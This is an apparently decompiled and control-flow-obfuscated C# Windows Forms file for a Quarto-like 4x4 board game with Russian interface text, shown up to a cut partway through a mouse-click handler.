using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			Dark = dark;
			Big = big;
			Square = square;
			Point = point;
		}

		public Figurine(Figurine copy)
		{
			Dark = copy.Dark;
			Big = copy.Big;
			Square = copy.Square;
			Point = copy.Point;
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_0267: Unknown result type (might be due to invalid IL or missing references)
		//IL_0271: Expected O, but got Unknown
		int num3 = default(int);
		bool flag = default(bool);
		int num4 = default(int);
		double num7 = default(double);
		while (true)
		{
			int num = 312883769;
			while (true)
			{
				uint num2;
				double num8;
				switch ((num2 = (uint)num ^ 0x639FBF19u) % 21u)
				{
				case 20u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					num = ((int)num2 * -203361528) ^ -2121769280;
					continue;
				}
				case 19u:
				{
					int num13;
					if (num3 < 4)
					{
						num = 1330116474;
						num13 = 1330116474;
					}
					else
					{
						num = 1741788312;
						num13 = 1741788312;
					}
					continue;
				}
				case 18u:
					num8 = 4.1;
					goto IL_0075;
				case 17u:
				{
					int num11;
					int num12;
					if (!flag)
					{
						num11 = 360377480;
						num12 = 360377480;
					}
					else
					{
						num11 = 846020285;
						num12 = 846020285;
					}
					num = num11 ^ ((int)num2 * -974773183);
					continue;
				}
				case 16u:
					pictureBox = new PictureBox[4, 4];
					num = (int)((num2 * 1832381358) ^ 0x227D24AB);
					continue;
				case 15u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num3, num4]);
					num = ((int)num2 * -1624239399) ^ -1011430341;
					continue;
				case 14u:
					num = (int)((num2 * 875357244) ^ 0x33B5753A);
					continue;
				case 13u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num3, num4]);
					num4++;
					num = ((int)num2 * -1131766582) ^ 0x3018688A;
					continue;
				case 12u:
				{
					PictureBox[,] array2 = borderBox;
					int num9 = num3;
					int num10 = num4;
					PictureBox obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)num4 + num7) * (double)size), 1 + num3 * size));
					Form1.smethod_7((Control)(object)obj2, bool_0: false);
					array2[num9, num10] = obj2;
					num = (int)((num2 * 597004850) ^ 0x556D9CA4);
					continue;
				}
				case 11u:
					if (num4 >= 2)
					{
						num = 1445593524;
						continue;
					}
					num8 = 0.0;
					goto IL_0075;
				case 10u:
					num = (int)((num2 * 458782701) ^ 0x6B9E0F9B);
					continue;
				case 9u:
					Form1.smethod_11((Control)(object)menu);
					num = (int)(num2 * 194158979) ^ -1685354489;
					continue;
				case 7u:
				{
					PictureBox[,] array = pictureBox;
					int num5 = num3;
					int num6 = num4;
					PictureBox obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)num4 + num7) * (double)size), 4 + num3 * size));
					Form1.smethod_5((Control)(object)obj, Color.White);
					array[num5, num6] = obj;
					Form1.smethod_6((Control)(object)pictureBox[num3, num4], new MouseEventHandler(PictureBoxIJ_MouseDown));
					num = (int)(num2 * 1361624263) ^ -1577695071;
					continue;
				}
				case 6u:
					num3++;
					num = ((int)num2 * -1313731112) ^ -1753151469;
					continue;
				case 4u:
					flag = num4 < 4;
					num = 396417651;
					continue;
				case 3u:
					borderBox = new PictureBox[4, 4];
					num = (int)(num2 * 1355399622) ^ -890191695;
					continue;
				case 2u:
					num4 = 0;
					num = 715185988;
					continue;
				case 1u:
					InitializeComponent();
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					num = ((int)num2 * -1079998702) ^ 0x713914A0;
					continue;
				case 0u:
					num3 = 0;
					num = ((int)num2 * -787403382) ^ -1076517301;
					continue;
				default:
					return;
				case 5u:
					break;
				case 8u:
					return;
					IL_0075:
					num7 = num8;
					num = 494284170;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		while (true)
		{
			int num = -1634615807;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xFF563470u) % 8u)
				{
				case 7u:
				{
					int num3;
					if (Form1.smethod_16((Control)(object)menu) < 296)
					{
						num = -2100180512;
						num3 = -2100180512;
					}
					else
					{
						num = -1799541326;
						num3 = -1799541326;
					}
					continue;
				}
				case 6u:
					num = ((int)num2 * -86860140) ^ 0x66DFAA7D;
					continue;
				case 5u:
					num = ((int)num2 * -74014223) ^ -320149126;
					continue;
				case 3u:
					num = (int)((num2 * 1732331545) ^ 0x66522694);
					continue;
				case 1u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -1235477402) ^ 0x6E747D30;
					continue;
				case 0u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = -653708557;
					continue;
				}
				case 4u:
					break;
				default:
					Form1.smethod_14(menu);
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num6 = default(int);
		bool flag = default(bool);
		int num3 = default(int);
		while (true)
		{
			int num = -204062326;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xACEEDE12u) % 22u)
				{
				case 21u:
					num = -2080655439;
					continue;
				case 19u:
					storage = new Figurine[4, 4];
					num = ((int)num2 * -565705160) ^ 0x17BC8513;
					continue;
				case 18u:
					num = ((int)num2 * -1663715503) ^ 0x5AE003AB;
					continue;
				case 17u:
					num6 = 0;
					num = -414689065;
					continue;
				case 16u:
					num = ((int)num2 * -1277031514) ^ -1177899619;
					continue;
				case 15u:
					flag = num6 < 4;
					num = -1693225822;
					continue;
				case 14u:
					Paint_Board();
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -1957914646) ^ 0x4C9F17DA;
					continue;
				case 13u:
					num3 = 0;
					num = (int)((num2 * 998446906) ^ 0x21CF372E);
					continue;
				case 12u:
					num6++;
					num = ((int)num2 * -1606432141) ^ 0x46753CFD;
					continue;
				case 11u:
					storage[num3, num6] = new Figurine(num3 < 2, num6 % 2 == 0, num6 < 2, num3 % 2 == 1);
					num = ((int)num2 * -85048477) ^ -1356769617;
					continue;
				case 10u:
					num = ((int)num2 * -1909342171) ^ 0x32769ED7;
					continue;
				case 9u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num6], bool_0: false);
					num = ((int)num2 * -889344156) ^ -486278915;
					continue;
				case 8u:
					Form1.smethod_5((Control)(object)borderBox[num3, num6], Color.White);
					num = (int)((num2 * 1572653335) ^ 0x39DA3384);
					continue;
				case 7u:
				{
					int num7;
					if (num3 < 4)
					{
						num = -289833809;
						num7 = -289833809;
					}
					else
					{
						num = -703694732;
						num7 = -703694732;
					}
					continue;
				}
				case 6u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = -588561269;
						num5 = -588561269;
					}
					else
					{
						num4 = -1992679888;
						num5 = -1992679888;
					}
					num = num4 ^ (int)(num2 * 1958207017);
					continue;
				}
				case 5u:
					num = (int)((num2 * 1738531306) ^ 0x6873FA82);
					continue;
				case 4u:
					num3++;
					num = ((int)num2 * -1063314138) ^ 0x68A71055;
					continue;
				case 2u:
					board = new Figurine[4, 4];
					num = ((int)num2 * -237670949) ^ -1392407657;
					continue;
				case 1u:
					Paint_Storage();
					num = (int)((num2 * 1981136296) ^ 0x6E8AB0EA);
					continue;
				case 0u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -189765622) ^ 0x4B2AC6A0;
					continue;
				default:
					return;
				case 3u:
					break;
				case 20u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
		int num4 = default(int);
		int num5 = default(int);
		Graphics graphics_ = default(Graphics);
		float num7 = default(float);
		float num8 = default(float);
		bool flag = default(bool);
		Brush brush_ = default(Brush);
		float num3 = default(float);
		float num6 = default(float);
		bool flag2 = default(bool);
		bool point = default(bool);
		bool big = default(bool);
		float num9 = default(float);
		while (true)
		{
			int num = -244683466;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xAD904199u) % 42u)
				{
				case 41u:
					num = ((int)num2 * -1277568470) ^ 0x2CE83652;
					continue;
				case 40u:
					num4++;
					num = ((int)num2 * -363290435) ^ 0x751A331E;
					continue;
				case 39u:
					num5++;
					num = ((int)num2 * -1798803586) ^ -409926002;
					continue;
				case 38u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num4 + 0.05f) * (float)size, ((float)num5 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = -1209239440;
					continue;
				case 37u:
				{
					int num21;
					int num22;
					if (!board[num5, num4].Square)
					{
						num21 = 1104936862;
						num22 = 1104936862;
					}
					else
					{
						num21 = 1152299780;
						num22 = 1152299780;
					}
					num = num21 ^ (int)(num2 * 1592367019);
					continue;
				}
				case 36u:
					num = (int)((num2 * 36464680) ^ 0x4451558E);
					continue;
				case 35u:
					num = (int)((num2 * 1623321110) ^ 0x36F87004);
					continue;
				case 34u:
					num = (int)((num2 * 291549526) ^ 0x56CDAB18);
					continue;
				case 33u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num5 = 0;
					num = (int)(num2 * 1336169900) ^ -540524336;
					continue;
				case 32u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1598163452) ^ -422347099;
					continue;
				case 31u:
					num = -1209709555;
					continue;
				case 30u:
					num7 = 1f - num8 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -540822582;
					continue;
				case 29u:
					flag = num5 < 4;
					num = -904107462;
					continue;
				case 28u:
					num = ((int)num2 * -1732654448) ^ 0x6F75C4E7;
					continue;
				case 27u:
				{
					int num12;
					if (num4 < 4)
					{
						num = -1986187389;
						num12 = -1986187389;
					}
					else
					{
						num = -1299799320;
						num12 = -1299799320;
					}
					continue;
				}
				case 26u:
					num = (int)((num2 * 1143584211) ^ 0x105B532A);
					continue;
				case 25u:
					num4 = 0;
					num = -690113190;
					continue;
				case 24u:
					brush_ = Form1.smethod_26();
					num = -1301522578;
					continue;
				case 23u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = (int)((num2 * 720923822) ^ 0x4AD45317);
					continue;
				case 22u:
					brush_ = Form1.smethod_25();
					num = (int)(num2 * 1122570142) ^ -2105900451;
					continue;
				case 21u:
				{
					int num19;
					int num20;
					if (!flag2)
					{
						num19 = 1460952640;
						num20 = 1460952640;
					}
					else
					{
						num19 = 1867168391;
						num20 = 1867168391;
					}
					num = num19 ^ (int)(num2 * 1249436100);
					continue;
				}
				case 20u:
				{
					int num17;
					int num18;
					if (point)
					{
						num17 = 403275694;
						num18 = 403275694;
					}
					else
					{
						num17 = 2016797143;
						num18 = 2016797143;
					}
					num = num17 ^ (int)(num2 * 251184246);
					continue;
				}
				case 19u:
					num8 = 0.7f;
					num = -3255875;
					continue;
				case 18u:
				{
					int num15;
					int num16;
					if (big)
					{
						num15 = -732560834;
						num16 = -732560834;
					}
					else
					{
						num15 = -898795394;
						num16 = -898795394;
					}
					num = num15 ^ ((int)num2 * -878758800);
					continue;
				}
				case 17u:
					flag2 = board[num5, num4] != null;
					num = (int)((num2 * 554911494) ^ 0x13ADF440);
					continue;
				case 16u:
					point = board[num5, num4].Point;
					num = (int)(num2 * 1406935088) ^ -800985395;
					continue;
				case 15u:
					num3 = (float)size * (num7 / 2f);
					num = ((int)num2 * -1724368518) ^ 0x5E060EB5;
					continue;
				case 14u:
					num = -1995687060;
					continue;
				case 13u:
				{
					int num13;
					int num14;
					if (board[num5, num4].Dark)
					{
						num13 = 1138875698;
						num14 = 1138875698;
					}
					else
					{
						num13 = 900231130;
						num14 = 900231130;
					}
					num = num13 ^ (int)(num2 * 1203778115);
					continue;
				}
				case 12u:
					num6 = num9 * 0.4f / (float)Form1.smethod_27(2.0);
					num = (int)(num2 * 386454591) ^ -713961283;
					continue;
				case 11u:
				{
					int num10;
					int num11;
					if (flag)
					{
						num10 = -640334580;
						num11 = -640334580;
					}
					else
					{
						num10 = -881334225;
						num11 = -881334225;
					}
					num = num10 ^ ((int)num2 * -710760042);
					continue;
				}
				case 9u:
					big = board[num5, num4].Big;
					num = -2098769289;
					continue;
				case 8u:
					num = ((int)num2 * -1116135275) ^ 0x356319C3;
					continue;
				case 7u:
					num6 = num9 * 0.9f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1530786798) ^ -1551125812;
					continue;
				case 6u:
					num7 = 1f - num8 * 0.9f / (float)Form1.smethod_27(2.0);
					num9 = (float)size * num8;
					num = -583132951;
					continue;
				case 5u:
					num8 = 1f;
					num = ((int)num2 * -1482073267) ^ 0x68684D26;
					continue;
				case 4u:
					num3 = (float)size * (num7 / 2f);
					num = (int)((num2 * 5064760) ^ 0xAECD3B6);
					continue;
				case 2u:
					Form1.smethod_28(graphics_, brush_, num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = ((int)num2 * -2025386122) ^ -1890900973;
					continue;
				case 1u:
					num = ((int)num2 * -1259813627) ^ -1074666934;
					continue;
				case 0u:
					Form1.smethod_24(graphics_, brush_, num3 + (float)(num4 * size), num3 + (float)(num5 * size), num6, num6);
					num = -1509500816;
					continue;
				default:
					return;
				case 10u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		int num6 = default(int);
		bool dark = default(bool);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num11 = default(float);
		float num13 = default(float);
		float num9 = default(float);
		bool big = default(bool);
		float num14 = default(float);
		bool flag = default(bool);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num2 = 213695455;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x5E31ABA4u) % 39u)
				{
				case 38u:
					num6 = 0;
					num2 = 1339895401;
					continue;
				case 37u:
				{
					int num17;
					int num18;
					if (!dark)
					{
						num17 = -1387277611;
						num18 = -1387277611;
					}
					else
					{
						num17 = -401038854;
						num18 = -401038854;
					}
					num2 = num17 ^ ((int)num3 * -1181746743);
					continue;
				}
				case 36u:
					Form1.smethod_28(graphics_, brush_, num11, num11, num13, num13);
					num2 = ((int)num3 * -847646285) ^ 0x2D0E7A21;
					continue;
				case 35u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num11, num11, num13, num13);
					num2 = (int)((num3 * 467143181) ^ 0xF3C2ABB);
					continue;
				case 34u:
				{
					float num10 = 1f - num9 * 0.4f / (float)Form1.smethod_27(2.0);
					num11 = (float)size * (num10 / 2f) - 4f;
					num2 = 578272579;
					continue;
				}
				case 32u:
					num9 = 0.7f;
					num2 = 1689681532;
					continue;
				case 31u:
					brush_ = Form1.smethod_26();
					num2 = 1334442506;
					continue;
				case 30u:
					Form1.smethod_24(graphics_, brush_, num11, num11, num13, num13);
					num2 = 1898494082;
					continue;
				case 29u:
				{
					int num19;
					int num20;
					if (big)
					{
						num19 = -1985404319;
						num20 = -1985404319;
					}
					else
					{
						num19 = -1594512077;
						num20 = -1594512077;
					}
					num2 = num19 ^ (int)(num3 * 1155036544);
					continue;
				}
				case 28u:
				{
					int num7;
					int num8;
					if (!storage[num, num6].Point)
					{
						num7 = 50212915;
						num8 = 50212915;
					}
					else
					{
						num7 = 579536228;
						num8 = 579536228;
					}
					num2 = num7 ^ (int)(num3 * 704232878);
					continue;
				}
				case 27u:
					num++;
					num2 = (int)((num3 * 1493370632) ^ 0x3F9EB095);
					continue;
				case 26u:
					num9 = 1f;
					num2 = (int)(num3 * 1407309946) ^ -227019874;
					continue;
				case 25u:
					num13 = num14 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -599363497) ^ 0x6969FAB;
					continue;
				case 23u:
					Form1.smethod_20(pictureBox[num, num6], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num6]), Form1.smethod_16((Control)(object)pictureBox[num, num6])));
					num2 = ((int)num3 * -2050188312) ^ 0x7D5FED1F;
					continue;
				case 22u:
				{
					float num10 = 1f - num9 * 0.9f / (float)Form1.smethod_27(2.0);
					num14 = (float)size * num9;
					num11 = (float)size * (num10 / 2f) - 4f;
					num2 = 604558175;
					continue;
				}
				case 21u:
					num2 = ((int)num3 * -2114622961) ^ 0x5FF99EC6;
					continue;
				case 20u:
					flag = num6 < 2;
					num2 = ((int)num3 * -2044191197) ^ -63776110;
					continue;
				case 19u:
					flag3 = storage[num, num6] != null;
					num2 = 295162898;
					continue;
				case 18u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num6]));
					num2 = ((int)num3 * -265413319) ^ 0x6EE60E1E;
					continue;
				case 17u:
				{
					int num21;
					int num22;
					if (flag3)
					{
						num21 = 1652163516;
						num22 = 1652163516;
					}
					else
					{
						num21 = 43611469;
						num22 = 43611469;
					}
					num2 = num21 ^ (int)(num3 * 243072152);
					continue;
				}
				case 16u:
					flag2 = num6 < 4;
					num2 = 1967966305;
					continue;
				case 15u:
					num2 = (int)((num3 * 1944034202) ^ 0x172D45DC);
					continue;
				case 14u:
					num2 = ((int)num3 * -830845213) ^ -412195086;
					continue;
				case 13u:
					Form1.smethod_30((Control)(object)pictureBox[num, num6]);
					num2 = 1661483115;
					continue;
				case 12u:
					num6++;
					num2 = 160049093;
					continue;
				case 11u:
				{
					int num15;
					int num16;
					if (!flag2)
					{
						num15 = -182026484;
						num16 = -182026484;
					}
					else
					{
						num15 = -733461891;
						num16 = -733461891;
					}
					num2 = num15 ^ ((int)num3 * -1938261324);
					continue;
				}
				case 10u:
					brush_ = Form1.smethod_25();
					num2 = (int)((num3 * 269248719) ^ 0x40F090FF);
					continue;
				case 9u:
					num13 = num14 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -1814368048) ^ -1325472703;
					continue;
				case 8u:
					dark = storage[num, num6].Dark;
					num2 = ((int)num3 * -1523362936) ^ -1467030727;
					continue;
				case 7u:
					num2 = (int)((num3 * 1769631559) ^ 0x4B973634);
					continue;
				case 6u:
					num2 = ((int)num3 * -1999438775) ^ 0x41C9938B;
					continue;
				case 5u:
					num2 = ((int)num3 * -1880066689) ^ -719994384;
					continue;
				case 4u:
				{
					int num12;
					if (num < 4)
					{
						num2 = 508721935;
						num12 = 508721935;
					}
					else
					{
						num2 = 170196168;
						num12 = 170196168;
					}
					continue;
				}
				case 3u:
					big = storage[num, num6].Big;
					num2 = 2054218234;
					continue;
				case 2u:
					num2 = ((int)num3 * -453982912) ^ -238641251;
					continue;
				case 1u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = 551358698;
						num5 = 551358698;
					}
					else
					{
						num4 = 1407199073;
						num5 = 1407199073;
					}
					num2 = num4 ^ ((int)num3 * -1910859363);
					continue;
				}
				case 0u:
					num2 = (int)((num3 * 631738071) ^ 0x7CDE1700);
					continue;
				default:
					return;
				case 33u:
					break;
				case 24u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		int num7 = default(int);
		int num8 = default(int);
		bool flag2 = default(bool);
		int num9 = default(int);
		int num10 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -1708879118;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xAF8F7B34u) % 29u)
				{
				case 28u:
					num = (int)((num2 * 21616272) ^ 0x2ADD0FFC);
					continue;
				case 27u:
					num = ((int)num2 * -909123417) ^ -34252718;
					continue;
				case 26u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -1676483160;
					continue;
				case 25u:
					Form1.smethod_7((Control)(object)pictureBox[num7, num8], bool_0: true);
					num = -1296342434;
					continue;
				case 24u:
					num = ((int)num2 * -1899481116) ^ -618898310;
					continue;
				case 23u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -2109594804) ^ -290792681;
					continue;
				case 21u:
					step = 0;
					num = ((int)num2 * -1389744468) ^ -1753011885;
					continue;
				case 20u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 1748899474) ^ 0x78F7D69A);
					continue;
				case 19u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					Form1.smethod_35(timer1, bool_0: true);
					num = (int)(num2 * 1395383383) ^ -810978460;
					continue;
				case 18u:
					Form1_Load(this, Form1.smethod_31());
					num = (int)(num2 * 874996646) ^ -1981624181;
					continue;
				case 17u:
					num8++;
					num = ((int)num2 * -221881370) ^ -1903464097;
					continue;
				case 16u:
					num = (int)((num2 * 1467191254) ^ 0x5627672F);
					continue;
				case 15u:
					num = ((int)num2 * -1939056066) ^ -1098922035;
					continue;
				case 14u:
				{
					int num11;
					int num12;
					if (!flag2)
					{
						num11 = -776608586;
						num12 = -776608586;
					}
					else
					{
						num11 = -1301487324;
						num12 = -1301487324;
					}
					num = num11 ^ ((int)num2 * -1797469819);
					continue;
				}
				case 13u:
					num = ((int)num2 * -1194656117) ^ 0xAC50C9C;
					continue;
				case 12u:
					num9 = Form1.smethod_33(rnd, 4);
					num10 = Form1.smethod_33(rnd, 4);
					num = -1010887956;
					continue;
				case 11u:
					num = ((int)num2 * -1033658154) ^ 0x6AA5F8E9;
					continue;
				case 10u:
					flag2 = num7 < 4;
					num = -529506062;
					continue;
				case 9u:
					flag = num8 < 4;
					num = -741981826;
					continue;
				case 7u:
					num7 = 0;
					num = ((int)num2 * -912195014) ^ -1008093962;
					continue;
				case 6u:
					Form1.smethod_5((Control)(object)borderBox[num9, num10], Color.Blue);
					num = (int)(num2 * 447989011) ^ -1593656060;
					continue;
				case 5u:
					num = (int)((num2 * 674357160) ^ 0x1D88BE6A);
					continue;
				case 4u:
					num8 = 0;
					num = -1683184053;
					continue;
				case 3u:
					step = 1;
					num = (int)((num2 * 966975408) ^ 0x4F736BB5);
					continue;
				case 2u:
					num7++;
					num = (int)(num2 * 1309326706) ^ -1170568664;
					continue;
				case 1u:
				{
					int num5;
					int num6;
					if (!turn)
					{
						num5 = 552669413;
						num6 = 552669413;
					}
					else
					{
						num5 = 1958766317;
						num6 = 1958766317;
					}
					num = num5 ^ (int)(num2 * 1678813743);
					continue;
				}
				case 0u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 1343713307;
						num4 = 1343713307;
					}
					else
					{
						num3 = 959658855;
						num4 = 959658855;
					}
					num = num3 ^ ((int)num2 * -325388433);
					continue;
				}
				case 8u:
					break;
				default:
					Form1.smethod_36(timer1);
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		while (true)
		{
			int num = -530969537;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x82592BEEu) % 3u)
				{
				case 1u:
					goto IL_001c;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_001c:
				Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
				num = (int)((num2 * 1254407835) ^ 0x1C501992);
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0202: Unknown result type (might be due to invalid IL or missing references)
		//IL_0218: Expected O, but got Unknown
		Point point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
		int num6 = default(int);
		int num8 = default(int);
		int num7 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -2119518393;
			while (true)
			{
				uint num2;
				int num5;
				switch ((num2 = (uint)num ^ 0xF6BCEBD8u) % 22u)
				{
				case 21u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)(num2 * 1926524460) ^ -920161722;
					continue;
				case 20u:
					num6 -= 4;
					num = (int)((num2 * 468604805) ^ 0x528EE3CD);
					continue;
				case 19u:
					if (storage[num8, num6] != null)
					{
						num = -1422902727;
						continue;
					}
					goto IL_0063;
				case 18u:
					Form1.smethod_5((Control)(object)borderBox[num7, num3], Color.White);
					num3++;
					num = -1964822884;
					continue;
				case 17u:
				{
					int num10;
					int num11;
					if (!flag)
					{
						num10 = -2108903345;
						num11 = -2108903345;
					}
					else
					{
						num10 = -939375078;
						num11 = -939375078;
					}
					num = num10 ^ ((int)num2 * -1139845518);
					continue;
				}
				case 16u:
					num = ((int)num2 * -1604906269) ^ -1736234760;
					continue;
				case 15u:
					Form1.smethod_5((Control)(object)borderBox[num8, num6], Color.Red);
					num = ((int)num2 * -1378650799) ^ -585646152;
					continue;
				case 14u:
					num = ((int)num2 * -1496490893) ^ 0x1E7D3C2F;
					continue;
				case 13u:
					num3 = 0;
					num = -1036126062;
					continue;
				case 12u:
					num = (int)(num2 * 1042195214) ^ -1210056048;
					continue;
				case 11u:
					num = ((int)num2 * -881868605) ^ 0x3C590AC1;
					continue;
				case 9u:
					num = ((int)num2 * -756464801) ^ 0x70C9E6C;
					continue;
				case 7u:
					num8 = point.Y / size;
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -1496935854) ^ 0x2A9F320D;
					continue;
				case 6u:
				{
					int num9;
					if (num7 >= 4)
					{
						num = -1391670459;
						num9 = -1391670459;
					}
					else
					{
						num = -510720989;
						num9 = -510720989;
					}
					continue;
				}
				case 5u:
					num7 = 0;
					num = (int)(num2 * 1204258987) ^ -962473957;
					continue;
				case 4u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)((num2 * 2133230555) ^ 0x3C8B9D93);
					continue;
				case 3u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num8, num6]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = -2066420922;
						num5 = -2066420922;
						continue;
					}
					goto IL_0063;
				case 2u:
					num7++;
					num = (int)((num2 * 1030108532) ^ 0x64D40BBC);
					continue;
				case 1u:
					num6 = point.X / size;
					flag = num6 > 1;
					num = ((int)num2 * -590709689) ^ -1438220124;
					continue;
				case 0u:
				{
					int num4;
					if (num3 < 4)
					{
						num = -1671898982;
						num4 = -1671898982;
					}
					else
					{
						num = -880686472;
						num4 = -880686472;
					}
					continue;
				}
				default:
					return;
				case 8u:
					break;
				case 10u:
					return;
					IL_0063:
					num = -301097106;
					num5 = -301097106;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_01a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01be: Expected O, but got Unknown
		bool flag2 = default(bool);
		int num5 = default(int);
		bool flag3 = default(bool);
		int num8 = default(int);
		Graphics graphics_ = default(Graphics);
		int num10 = default(int);
		int num9 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 1111357629;
			while (true)
			{
				uint num2;
				int num11;
				switch ((num2 = (uint)num ^ 0x7C30D027u) % 27u)
				{
				case 26u:
					num = (int)((num2 * 1650092303) ^ 0x3C68C2C0);
					continue;
				case 25u:
					flag2 = num5 < 4;
					num = 1925606923;
					continue;
				case 24u:
				{
					int num12;
					int num13;
					if (!flag3)
					{
						num12 = -362182379;
						num13 = -362182379;
					}
					else
					{
						num12 = -530898349;
						num13 = -530898349;
					}
					num = num12 ^ (int)(num2 * 1048785916);
					continue;
				}
				case 23u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 1149718632) ^ -1805383706;
					continue;
				case 22u:
					num = (int)(num2 * 444470474) ^ -337894737;
					continue;
				case 21u:
					flag3 = num8 < 4;
					num = 2091765077;
					continue;
				case 19u:
					num8 = 0;
					num = ((int)num2 * -1255551695) ^ -233828127;
					continue;
				case 18u:
					Paint_Board();
					num = ((int)num2 * -1122628576) ^ -978968739;
					continue;
				case 17u:
					Form1.smethod_45(graphics_);
					num = (int)((num2 * 1675119632) ^ 0x3A466037);
					continue;
				case 16u:
					num = ((int)num2 * -1554525979) ^ 0x15CD07FB;
					continue;
				case 15u:
					num = ((int)num2 * -713580428) ^ 0x4E1C8D32;
					continue;
				case 14u:
					num5++;
					num = 574027944;
					continue;
				case 13u:
